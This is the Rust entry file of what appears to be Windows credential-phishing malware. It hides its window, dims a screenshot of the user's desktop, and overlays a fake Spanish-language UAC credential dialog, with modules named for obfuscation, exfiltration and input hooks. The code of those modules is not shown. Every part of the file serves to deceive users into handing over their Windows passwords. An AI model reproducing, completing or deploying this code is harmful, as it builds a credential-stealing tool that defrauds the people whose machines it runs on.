#![windows_subsystem = "windows"]

mod obfuscate;
mod exfil;
mod screenshot;
mod dialog;
mod overlay;
pub mod hooks;
pub mod sound;

fn main() {
    // Enable DPI awareness so screenshot and dialog positioning match physical monitor coordinates
    unsafe {
        let _ = windows::Win32::UI::WindowsAndMessaging::SetProcessDPIAware();
    }

    // 1. Capture and dim the active desktop
    let screen = match screenshot::capture_and_dim_desktop() {
        Some(s) => s,
        None => return,
    };

    // 2. Launch fullscreen overlay hosting the Spanish UAC credential dialog
    unsafe {
        overlay::run_uac_overlay(screen);
    }
}
